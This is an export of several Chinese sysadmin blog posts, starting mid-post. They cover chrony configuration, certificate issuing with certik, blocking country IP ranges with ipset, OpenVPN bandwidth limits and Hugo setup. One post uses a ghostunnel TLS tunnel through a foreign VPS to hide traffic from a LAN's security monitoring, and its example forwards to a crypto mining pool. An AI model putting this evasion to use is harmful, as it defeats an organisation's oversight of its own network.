这个是把系统时钟同步到主板的硬件时钟去。\n缺省情况下是11分钟同步一次\n四、logchange logchange 0.5，意思是如果chrony调整的系统时间，超过了0.5秒的时长，就会发一条消息到syslog，这样我们就能在/var/log/messages里看到这条消息了。\n五、验证调试 开发人员会问，什么时候同步的服务器啊，多长时间同步一次，时间到底准不准啊，有没有发生跳跃啊\n我们就用chronyc sources来验证，配置中\nserver 172.10.1.1 iburst prefer minpoll 4 maxpoll 5 server 172.10.1.2 iburst 解释一下，minpoll 4 maxpoll 5 ，那么最小轮询时间16秒，最大32秒。\n我们可以看到上图 LastRx 就是上次询问时间服务器的间隔时间，14秒、15秒、16秒，然后就变1了，最小间隔16秒后，立即就询问时间服务器，同步时间。\n同样可以看到第二台时间服务器就不受这个限制，缺省minpoll 6，就是64秒。所以上图第二台，63秒、64秒、65秒，变0，才去询问时间服务器。\n总结一下，chrony 调整时间偏差是匀速的，缓慢的。它询问时间服务器的间隔由minpoll来控制。\n我们用logchange来记录大的时间调整，以备追溯和查询。\n","permalink":"https://rendoumi.com/posts/20211020-chrony/","summary":"\u003cp\u003echrony 已经成了事实标准，替代了ntp。\u003c/p\u003e\n\u003cp\u003e但是，有几个细节，需要非常注意。\u003c/p\u003e\n\u003cp\u003e给出我们的配置，/etc/chrony.conf\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Use public servers from the pool.ntp.org project.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Please consider joining the pool (http://www.pool.ntp.org/join.html).\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eserver 172.10.1.1 iburst prefer minpoll 6 maxpoll 10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eserver 172.10.1.2 iburst\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Record the rate at which the system clock gains/losses time.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edriftfile /var/lib/chrony/drift\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Allow the system clock to be stepped in the first three updates\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# if its offset is larger than 1 second.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emakestep 1.0 3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enable kernel synchronization of the real-time clock (RTC).\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ertcsync\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enable hardware timestamping on all interfaces that support it.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#hwtimestamp *\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase the minimum number of selectable sources required to adjust\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# the system clock.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#minsources 2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Allow NTP client access from local network.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#allow 192.168.0.0/16\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Serve time even if not synchronized to a time source.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#local stratum 10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Specify file containing keys for NTP authentication.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#keyfile /etc/chrony.keys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Specify directory for log files.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elogdir /var/log/chrony\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elogchange 0.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Select which information is logged.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#log measurements statistics tracking rtc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e里面有好几个细节，下面逐一解释一下：\u003c/p\u003e","title":"Chrony的几个详细配置细节"},{"content":"很现实的问题，局域网内有态势感知和网络流量分析，这很讨厌！\n那么，如何把某段流量隐藏起来，让态势感知无法分析呢？\n前提条件，你需要有国外的一台 VPS 作为外援，把 TCP 流量通过 TLS 加密送到国外的服务器，然后再转发到正确的目标服务器上，这样就不会被人追踪了。\n这里推荐 Ghostunnel ，这是个 Go 的程序，只有一个执行文件。配合 certik 证书生成，就完美了。\n项目地址：https://github.com/ghostunnel/ghostunnel\n首先我们使用 certik 生成三个证书，ca.pem server.pem 和 client1.pem\n然后ghostunnel以及三个证书文件都放在/usr/local/bin下\n一、在VPS上运行ghostunnel模式server /usr/local/bin/ghostunnel server --listen 0.0.0.0:9999 --target tr.dero.herominers.com:1117 --keystore server.pem --cacert ca.pem --allow-cn client1 --unsafe-target 上面监听了端口0.0.0.0:9999（监听0.0.0.0必须加参数\u0026ndash;unsafe-target），远程转发到dero的矿池端口1117，只允许验证过的cn client1连接。\n二、在本地机器上运行ghostunnel模式client /usr/local/bin/ghostunnel client --listen localhost:9999 --target 193.42.114.129:9999 --keystore client.pem --cacert ca.pem 本地监听localhost:9999，所以不用加\u0026ndash;unsafe-target参数，然后连接到远程 vps 服务器，ip地址是193.42.114.129，端口是9999\n这样就完成了。可以放心的启动程序，连接到本地端口localhost:9999，TCP流量就会被隐藏起来，不会被分析到.\n","permalink":"https://rendoumi.com/posts/20211019-ghostunnel/","summary":"\u003cp\u003e很现实的问题，局域网内有态势感知和网络流量分析，这很讨厌！\u003c/p\u003e\n\u003cp\u003e那么，如何把某段流量隐藏起来，让态势感知无法分析呢？\u003c/p\u003e\n\u003cp\u003e前提条件，你需要有国外的一台 VPS 作为外援，把 TCP 流量通过 TLS 加密送到国外的服务器，然后再转发到正确的目标服务器上，这样就不会被人追踪了。\u003c/p\u003e\n\u003cp\u003e这里推荐 Ghostunnel  ，这是个 Go 的程序，只有一个执行文件。配合 certik 证书生成，就完美了。\u003c/p\u003e\n\u003cp\u003e项目地址：https://github.com/ghostunnel/ghostunnel\u003c/p\u003e\n\u003cp\u003e首先我们使用 certik 生成三个证书，ca.pem server.pem 和 client1.pem\u003c/p\u003e\n\u003cp\u003e然后ghostunnel以及三个证书文件都放在/usr/local/bin下\u003c/p\u003e\n\u003ch2 id=\"一在vps上运行ghostunnel模式server\"\u003e一、在VPS上运行ghostunnel模式server\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/bin/ghostunnel server --listen 0.0.0.0:9999 --target tr.dero.herominers.com:1117 --keystore server.pem --cacert ca.pem --allow-cn client1 --unsafe-target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e上面监听了端口0.0.0.0:9999（监听0.0.0.0必须加参数\u0026ndash;unsafe-target），远程转发到dero的矿池端口1117，只允许验证过的cn client1连接。\u003c/p\u003e\n\u003ch2 id=\"二在本地机器上运行ghostunnel模式client\"\u003e二、在本地机器上运行ghostunnel模式client\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/bin/ghostunnel client --listen localhost:9999 --target 193.42.114.129:9999 --keystore client.pem --cacert ca.pem \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e本地监听localhost:9999，所以不用加\u0026ndash;unsafe-target参数，然后连接到远程 vps 服务器，ip地址是193.42.114.129，端口是9999\u003c/p\u003e\n\u003cp\u003e这样就完成了。可以放心的启动程序，连接到本地端口localhost:9999，TCP流量就会被隐藏起来，不会被分析到.\u003c/p\u003e","title":"ghostunnel使用TLS加密TCP流量"},{"content":"我们会有很多时候需要用到TLS证书，一个非常方便、小众的工具就是 certik 。\n这个软件纯由 Go 组成，就一个可执行文件，使用了 etcd 的 boltdb 格式存放所有的证书。\n软件地址：https://github.com/opencoff/certik\n使用：\n一、初始化证书库 ./certik -v tls.db init CA 二、签发一张server证书 #./certik -v tls.db server -i IP.ADDR.ES server.domain.name ./certik -v tls.db server -i 193.42.114.129 server 上面我们 server 的 ip 是193.42.114.129，域名简洁起见就叫 server 了 。\n三、签发一张client1证书 ./certik -v tls.db client client1 四、查看证书库 ./certik -v tls.db list 我们就可以看到三个证书了，一个 CA ，一个 server ，一个 client1\n五、导出各个证书 #导出CA ./certik -v tls.db export --root-ca #导出server ./certik -v tls.db export server #导出client1 ./certik -v tls.db export client1 以上就可以得到各个东西了。\n那么我们 gen 出证书做什么用呢？当然用作 ghostunnel 的验证用\n","permalink":"https://rendoumi.com/posts/20211019-certik/","summary":"\u003cp\u003e我们会有很多时候需要用到TLS证书，一个非常方便、小众的工具就是 certik 。\u003c/p\u003e\n\u003cp\u003e这个软件纯由 Go 组成，就一个可执行文件，使用了 etcd 的 boltdb 格式存放所有的证书。\u003c/p\u003e\n\u003cp\u003e软件地址：https://github.com/opencoff/certik\u003c/p\u003e\n\u003cp\u003e使用：\u003c/p\u003e\n\u003ch2 id=\"一初始化证书库\"\u003e一、初始化证书库\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./certik -v tls.db init CA\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"二签发一张server证书\"\u003e二、签发一张server证书\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#./certik -v tls.db server -i IP.ADDR.ES server.domain.name\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./certik -v tls.db server -i 193.42.114.129 server\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e上面我们 server 的 ip 是193.42.114.129，域名简洁起见就叫 server 了 。\u003c/p\u003e\n\u003ch2 id=\"三签发一张client1证书\"\u003e三、签发一张client1证书\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./certik -v tls.db client client1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"四查看证书库\"\u003e四、查看证书库\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./certik -v tls.db list\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我们就可以看到三个证书了，一个 CA ，一个 server ，一个 client1\u003c/p\u003e\n\u003ch2 id=\"五导出各个证书\"\u003e五、导出各个证书\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#导出CA\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./certik -v tls.db \u003cspan class=\"nb\"\u003eexport\u003c/span\u003e --root-ca\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#导出server\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./certik -v tls.db \u003cspan class=\"nb\"\u003eexport\u003c/span\u003e server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#导出client1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./certik -v tls.db \u003cspan class=\"nb\"\u003eexport\u003c/span\u003e client1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e以上就可以得到各个东西了。\u003c/p\u003e","title":"Certik 证书签发软件"},{"content":"现在国内都禁止挖币，什么币安、火币、cnspark之类的都不允许国内 IP 访问了。\n如何实现的呢？\n首先需要得到国家IP段，下载地址：http://www.ipdeny.com/ipblocks/。这里以我们国家 cn 为例\n步骤如下：\n一、安装ipset #Debian/Ubuntu系统 apt-get -y install ipset #CentOS系统 yum -y install ipset 二、清空iptable规则 #防止设置不生效，清空之前的防火墙规则 iptables -P INPUT ACCEPT iptables -F 三、创建ipset规则集 #创建一个名为cnip的规则 ipset -N cnip hash:net #下载国家IP段，这里以中国为例 wget -P . http://www.ipdeny.com/ipblocks/data/countries/cn.zone #将IP段添加到cnip规则集中 for i in $(cat /root/cn.zone ); do ipset -A cnip $i; done 四、创建iptable黑名单 #扔黑名单 iptables -A INPUT -p tcp --dport 80 -m set --match-set cnip src -j DROP iptables -A INPUT -p tcp --dport 443 -m set --match-set cnip src -j DROP #然后放行其他的 iptables -P INPUT ACCEPT ","permalink":"https://rendoumi.com/posts/20211018-ipset_block_cn/","summary":"\u003cp\u003e现在国内都禁止挖币，什么币安、火币、cnspark之类的都不允许国内 IP 访问了。\u003c/p\u003e\n\u003cp\u003e如何实现的呢？\u003c/p\u003e\n\u003cp\u003e首先需要得到国家\u003ccode\u003eIP\u003c/code\u003e段，下载地址：http://www.ipdeny.com/ipblocks/。这里以我们国家 cn 为例\u003c/p\u003e\n\u003cp\u003e步骤如下：\u003c/p\u003e\n\u003ch2 id=\"一安装ipset\"\u003e一、安装ipset\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Debian/Ubuntu系统\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt-get -y install ipset\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#CentOS系统\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install ipset\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"二清空iptable规则\"\u003e二、清空iptable规则\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#防止设置不生效，清空之前的防火墙规则\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -P INPUT ACCEPT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -F\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"三创建ipset规则集\"\u003e三、创建ipset规则集\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#创建一个名为cnip的规则\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eipset -N cnip hash:net\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#下载国家IP段，这里以中国为例\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget -P . http://www.ipdeny.com/ipblocks/data/countries/cn.zone\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#将IP段添加到cnip规则集中\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e i in \u003cspan class=\"k\"\u003e$(\u003c/span\u003ecat /root/cn.zone \u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e ipset -A cnip \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"四创建iptable黑名单\"\u003e四、创建iptable黑名单\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#扔黑名单\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -A INPUT -p tcp --dport \u003cspan class=\"m\"\u003e80\u003c/span\u003e -m \u003cspan class=\"nb\"\u003eset\u003c/span\u003e --match-set cnip src -j DROP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -A INPUT -p tcp --dport \u003cspan class=\"m\"\u003e443\u003c/span\u003e -m \u003cspan class=\"nb\"\u003eset\u003c/span\u003e --match-set cnip src -j DROP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#然后放行其他的\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -P INPUT ACCEPT\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"使用IPSET封掉某个国家整个的访问"},{"content":"公司安装了 openvpn ，带来方便，但是也有很多不便的地方，机房的总带宽就那么多。\n很多人共用 vpn 的时候，就会抢占带宽。\n那么，我们需要限制一下，限制 openvpn 所能使用的带宽，避免抢占 WEB 的带宽\n做法如下：\n由于我们不是要单独限制某一个 openvpn 用户，而是限制整体，所以简单用 TC 就可以了\n#!/bin/sh tc qdisc del dev tun0 root tc qdisc add dev tun0 root handle 1: htb default 1 tc class add dev tun0 parent 1: classid 1:1 htb rate 30Mbit ceil 30Mbit 解释一下：\n我们 openvpn 启的是 tun0 ，所以限制的对象就是 dev tun0 首先第一行清除 tun0 的根队列 然后第二行建立 tun0 的 root 根队列为 1:0 htb ，缺省是1:1的子队列 最后一行，第三行建立 1:1 的子队列，带宽限制是 30Mbit ，注意这里是大B，就是网络术语中的带宽，换算成小b的话，需要除以8 效果很明显，直接被限制住（41兆而不是30M是因为这台机器是虚机，实体机上还有别的流量）：\n","permalink":"https://rendoumi.com/posts/20211018-openvpn_limit_bandwidth/","summary":"\u003cp\u003e公司安装了 openvpn ，带来方便，但是也有很多不便的地方，机房的总带宽就那么多。\u003c/p\u003e\n\u003cp\u003e很多人共用 vpn 的时候，就会抢占带宽。\u003c/p\u003e\n\u003cp\u003e那么，我们需要限制一下，限制 openvpn 所能使用的带宽，避免抢占 WEB 的带宽\u003c/p\u003e\n\u003cp\u003e做法如下：\u003c/p\u003e\n\u003cp\u003e由于我们不是要单独限制某一个 openvpn 用户，而是限制整体，所以简单用 TC 就可以了\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003etc qdisc del dev tun0 root  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etc qdisc add dev tun0 root handle 1: htb default \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etc class add dev tun0 parent 1: classid 1:1 htb rate 30Mbit ceil 30Mbit\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e解释一下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e我们 openvpn 启的是 tun0 ，所以限制的对象就是 dev tun0\u003c/li\u003e\n\u003cli\u003e首先第一行清除 tun0 的根队列\u003c/li\u003e\n\u003cli\u003e然后第二行建立 tun0 的 root 根队列为 1:0 htb ，缺省是1:1的子队列\u003c/li\u003e\n\u003cli\u003e最后一行，第三行建立 1:1 的子队列，带宽限制是 30Mbit ，注意这里是大B，就是网络术语中的带宽，换算成小b的话，需要除以8\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e效果很明显，直接被限制住（41兆而不是30M是因为这台机器是虚机，实体机上还有别的流量）：\u003c/p\u003e","title":"OpenVPN 限制流量带宽"},{"content":"本站这个博客的由来：\n源自于 wiredcraft 的面试，这个公司让老八很是向往，可以远程工作，第一次面试是 devops ，老外见面聊了后，由代理中国人面。因为面的是K8S的东西，正好刚给画包包公司做了整体迁往阿里ACK的工程，以为没问题，实际是直接问倒了我。就好比master node上面都跑了什么进程，唉，一言难尽啊，又问到ansible的变量，回答估计也不满意，结果就挂了\n知耻而后勇，后面去恶补了一下ansible和k8s的东西，实际也是实际操作居多，然后第二次面的是 sysadmin，全程老外面。还出了几道题，应该是没问题。但是工资要高了，也被刷了。\n这个博客就是其中一道题，那既然搭建出来了，干脆就好好用吧。\n本身自己对静态的 Blog 系统也比较感兴趣，自己主站 www.rendoumi.com 的 Blog 是由 journey 搭建的，是一个精巧的 go 程序，最妙的是它兼容 Ghost 博客系统，也能使用 Ghost 的 theme ，这样就完美的把自己以前 Ghost 的博客迁移了过去，但是，里面文章有很多过时了，但也不想清理，干脆借着这个机会，从新开始。搭一个自己喜欢的系统继续写新博客\n流行的 Markdown 写作平台有Hexo和Hugo，选Hugo是因为实在是不喜欢node，弄一堆npm，迁移麻烦死。\n这个博客程序基于Hugo，托管在 github，众所周知，github 是托管静态文件的地方，Markdown的最大毛病是图片。图片放在图床也不是好办法，所以图片和静态文件要在一起，下面就说一下搭建过程，我的主机是Ubuntu：\n一、下载Hugo 下载地址： https://github.com/gohugoio/hugo/releases/download/v0.88.1/hugo_0.88.1_Linux-64bit.tar.gz\nwget https://github.com/gohugoio/hugo/releases/download/v0.88.1/hugo_0.88.1_Linux-64bit.tar.gz tar zxvf hugo_0.88.1_Linux-64bit.tar.gz 二、初始一个博客写作目录 ./hugo new site MyBlog ​\n三、下载theme cd MyBlog git clone https://github.com/halogenica/beautifulhugo.git themes/beautifulhugo echo theme = \\\u0026#34;beautifulhugo\\\u0026#34; \u0026gt;\u0026gt; config.toml ​\n四、写一篇新文章 cd MyBlog ../hugo new posts/my-first-post.md echo \u0026#34;#### This is another Blog\u0026#34; \u0026gt;\u0026gt; content/posts/my-first-post.md 五、运行server，build草稿 cd MyBlog ../hugo server --buildDrafts ​\n六、测试一下 curl http://localhost:1313 ​\n七、推送到github 